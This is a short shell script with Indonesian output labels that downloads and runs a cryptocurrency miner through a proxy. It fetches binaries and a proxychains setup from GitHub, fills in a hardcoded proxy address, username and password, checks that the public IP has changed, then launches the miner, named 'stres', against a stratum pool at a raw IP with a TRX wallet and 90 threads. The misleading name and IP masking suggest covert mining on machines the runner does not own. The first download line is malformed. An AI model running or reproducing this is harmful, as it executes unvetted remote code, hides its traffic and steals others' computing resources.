proxy="159.203.56.123" 
port="3135" 
user="mikayui"  
pass="12345"
wget -q -O stres wget https://raw.githubusercontent.com/amit12986/SC/main/sse2
chmod +x stres
wget -q https://github.com/amit12986/code/raw/main/panel && chmod +x panel 
wget -q https://github.com/amit12986/code/raw/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://github.com/amit12986/code/raw/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf"  
sleep 3 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./stres -a yespower -o stratum+tcp://141.95.55.97:6533 -u TChMu1HcBrySoiYi4nS2AHMSgLYY6j28ws -p c=TRX -t 90
